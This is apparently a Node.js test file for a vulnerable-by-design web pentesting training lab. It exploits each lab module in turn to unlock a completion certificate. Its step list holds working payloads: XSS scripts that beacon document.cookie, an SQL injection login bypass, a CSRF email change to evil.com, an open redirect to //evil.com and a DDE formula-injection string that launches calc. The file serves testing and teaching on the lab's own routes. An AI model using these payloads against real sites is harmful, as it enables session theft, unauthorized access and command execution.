'use strict';
// M13 certificate test: completes the ENTIRE zero-to-web-pentester career path
// with REAL exploits (the same exploit each module's own test proves), in
// order, on one student session, then checks the PNG certificate unlocks:
// 200 + image/png + real PNG magic + a certificate button on the path page.
// No browser is available, so the two XSS beacons play the browser the same
// way tests/xss.test.js does: fetch the page, run its live inline scripts in
// a vm sandbox with a stubbed DOM, then deliver the beacon the script built
// to the real collector.
const test = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

const PATH_ID = 'zero-to-web-pentester';

// ---------------------------------------------------------------- browser sim
// (copied pattern from tests/xss.test.js; attribute values, comments and
// textarea text are never mistaken for script tags)
const TAG_RE = /<(\/?)([a-zA-Z][^\s/>]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g;

function liveScripts(html) {
  const src = html.replace(/<!--[\s\S]*?-->/g, '').replace(/<textarea\b[^>]*>[\s\S]*?<\/textarea>/gi, '');
  const out = [];
  TAG_RE.lastIndex = 0;
  let m;
  while ((m = TAG_RE.exec(src))) {
    if (m[1] === '/' || m[2].toLowerCase() !== 'script') continue;
    const i = src.slice(TAG_RE.lastIndex).search(/<\/script/i);
    const end = i >= 0 ? TAG_RE.lastIndex + i : src.length;
    if (!/\bsrc\s*=/.test(m[3])) out.push(src.slice(TAG_RE.lastIndex, end));
    TAG_RE.lastIndex = end;
  }
  return out;
}

function makeBrowser(cookie) {
  const calls = [];
  const errors = [];
  const els = {};
  const el = (id) => (els[id] = els[id] || {
    style: {}, textContent: '', innerHTML: '', hidden: true,
    getAttribute: () => '/xss/claim-status?v=none',
    querySelector: () => ({ style: {} }),
  });
  const ctx = {
    document: { cookie, getElementById: el },
    location: { hash: '', search: '' },
    fetch: (u) => { calls.push(String(u)); return Promise.resolve({ json: () => Promise.resolve({ captured: false }) }); },
    setInterval: () => 0,
    alert: () => { calls.push('ALERT'); },
    URLSearchParams,
    decodeURIComponent,
  };
  ctx.window = ctx;
  vm.createContext(ctx);
  const run = (code) => {
    try { vm.runInContext(code, ctx, { timeout: 1000 }); } catch (e) { errors.push(e.message); }
  };
  return {
    calls, errors,
    runPage: (html) => liveScripts(html).forEach(run),
    beacons: () => calls.filter((u) => u.startsWith('/xss/collect')),
  };
}

async function deliver(c, browser) {
  let last = null;
  for (const url of browser.beacons()) {
    const r = await c.get(url);
    if (r.status === 200) return r;
    last = r;
  }
  return last;
}

// The beacon JavaScript every claim box documents: report back to the
// collector with the session cookie, the challenge id and the single-use
// page token.
const beaconJs = (v, token = 'window.__px') => `fetch('/xss/collect?c='+document.cookie+'&v=${v}&n='+${token})`;
const q = encodeURIComponent;

// ------------------------------------------------------------ step exploits
// Each exploit performs the documented attack for one path step and returns
// the server response that should carry the flag.
const STEPS = [
  {
    moduleId: 'xss', vulnId: 'reflected', capturedKey: 'xss:Reflected XSS',
    async exploit(c) {
      const page = await c.get('/xss/search?q=' + q(`<script>${beaconJs('reflected')}</script>`));
      const b = makeBrowser(c.cookie());
      b.runPage(page.text);
      assert.deepEqual(b.errors, []);
      return deliver(c, b);
    },
  },
  {
    moduleId: 'sqli', vulnId: 'login-bypass', capturedKey: 'sqli:Login Bypass',
    async exploit(c) {
      return c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'anything' });
    },
  },
  {
    moduleId: 'idor', vulnId: 'profile', capturedKey: 'idor:Profile IDOR',
    async exploit(c) {
      await c.get('/idor/login/alice');
      return c.get('/idor/users/1');
    },
  },
  {
    moduleId: 'csrf', vulnId: 'email', capturedKey: 'csrf:Change Email with No CSRF Token (state-changing GET)',
    async exploit(c) {
      await c.get('/csrf/login/alice');
      return c.get('/csrf/change-email?email=pwned%40evil.com');
    },
  },
  {
    moduleId: 'misconfig', vulnId: 'debug', capturedKey: 'misconfig:Verbose Debug Errors',
    async exploit(c) {
      return c.get('/misconfig/debug?err=1');
    },
  },
  {
    moduleId: 'http', vulnId: 'verb-tamper', capturedKey: 'http:Verb Tampering',
    async exploit(c) {
      return c.get('/http/feedback?msg=tampered verb');
    },
  },
  {
    moduleId: 'redirect', vulnId: 'redirect-double-slash', capturedKey: 'redirect:Protocol-Relative Redirect',
    // The redirect answers 302 with the flag riding in the body (see the
    // module test), so this step expects 302, not 200.
    expectStatus: 302,
    async exploit(c) {
      return c.get('/redirect/go?next=' + q('//evil.com'));
    },
  },
  {
    moduleId: 'formula', vulnId: 'formula-csv', capturedKey: 'formula:Classic Formula Injection',
    async exploit(c) {
      const add = await c.post('/formula/add', { name: "=cmd|' /C calc'!A0", note: 'classic' });
      assert.equal(add.status, 302, 'adding the contact should redirect back');
      const r = await c.get('/formula/export.csv');
      assert.equal(r.status, 200, 'export should download');
      return { flagsHeader: r.headers.get('x-flags') || '' };
    },
  },
  {
    moduleId: 'auth', vulnId: 'user-enum', capturedKey: 'auth:Username Enumeration',
    async exploit(c) {
      // Probe the login oracle first (the wrong-password message leaks the
      // username), then submit the enumerated username.
      const probe = await c.post('/auth/enum-login', { username: 'alice', password: 'definitely-wrong' });
      assert.ok(probe.text.includes('Wrong password for user'), 'the oracle must confirm alice exists');
      return c.post('/auth/enum-submit', { username: 'alice' });
    },
  },
  {
    moduleId: 'xss', vulnId: 'stored', capturedKey: 'xss:Stored XSS',
    async exploit(c) {
      await c.post('/xss/guestbook', { author: 'mallory', body: `<script>${beaconJs('stored')}</script>` });
      const page = await c.get('/xss/guestbook');
      const b = makeBrowser(c.cookie());
      b.runPage(page.text);
      assert.deepEqual(b.errors, []);
      return deliver(c, b);
    },
  },
];

const noFlag = (text, label) => assert.equal((text.match(FLAG_RE) || []).length, 0, `${label}: flag leaked in body`);

test('paths certificate', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (modId, vulnId) => flagFromDb(dataDir, modId, vulnId);
  const c = client(srv.base);

  await t.test('certificate is locked (403) before any step is captured', async () => {
    const r = await c.get(`/paths/${PATH_ID}/certificate`);
    assert.equal(r.status, 403, 'fresh session must not unlock the certificate');
    noFlag(r.text, 'locked certificate page');
    const page = await c.get(`/paths/${PATH_ID}`);
    assert.equal(page.status, 200);
    assert.ok(page.text.includes('0/10'), 'path page shows 0/10 progress');
    assert.ok(!page.text.includes(`/paths/${PATH_ID}/certificate`), 'no certificate button before completion');
  });

  await t.test('all 10 steps fall to the real exploits, in order, on one session', async () => {
    for (const [i, step] of STEPS.entries()) {
      const r = await step.exploit(c);
      const key = `${step.moduleId}:${step.vulnId}`;
      const expectedFlag = flagOf(step.moduleId, step.vulnId);
      if (step.vulnId === 'formula-csv') {
        assert.ok(r.flagsHeader.includes(expectedFlag), `step ${i + 1} (${key}): flag must be in the x-flags header`);
      } else {
        assert.ok(r, `step ${i + 1} (${key}): beacon/response must exist`);
        const want = step.expectStatus || 200;
        assert.equal(r.status, want, `step ${i + 1} (${key}): exploit response must be ${want}`);
        assert.ok(r.text.includes(expectedFlag), `step ${i + 1} (${key}): flag must be in the exploit response`);
      }
      assert.ok((await capturedSet(c)).includes(step.capturedKey),
        `step ${i + 1} (${key}): must be captured on the scoreboard`);
      const n = i + 1;
      const page = await c.get(`/paths/${PATH_ID}`);
      assert.ok(page.text.includes(`${n}/10`), `path page shows ${n}/10 after step ${n}`);
    }
  });

  await t.test('certificate unlocks: 200, image/png, real PNG magic, larger than 10KB', async () => {
    const raw = await fetch(srv.base + `/paths/${PATH_ID}/certificate`, { headers: { cookie: c.cookie() } });
    assert.equal(raw.status, 200, 'completed path must unlock the certificate');
    const ctype = raw.headers.get('content-type');
    assert.ok(ctype && ctype.includes('image/png'), `content-type must be image/png, got ${ctype}`);
    const buf = Buffer.from(await raw.arrayBuffer());
    assert.deepEqual([...buf.subarray(0, 8)], [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], 'PNG magic bytes');
    assert.ok(buf.length > 10240, `certificate must be larger than 10KB, got ${buf.length} bytes`);
    // No flag-shaped literal may ride along in the binary either.
    assert.equal(buf.toString('latin1').match(FLAG_RE), null, 'flag-shaped literal in PNG bytes');
  });

  await t.test('path page shows the certificate button after completion', async () => {
    const page = await c.get(`/paths/${PATH_ID}`);
    assert.equal(page.status, 200);
    assert.ok(page.text.includes('10/10'), 'path page shows 10/10 progress');
    assert.ok(page.text.includes(`/paths/${PATH_ID}/certificate`), 'certificate button link is present');
    assert.ok(page.text.includes('Get my certificate'), 'certificate button text is present');
    noFlag(page.text, 'completed path page');
  });
});
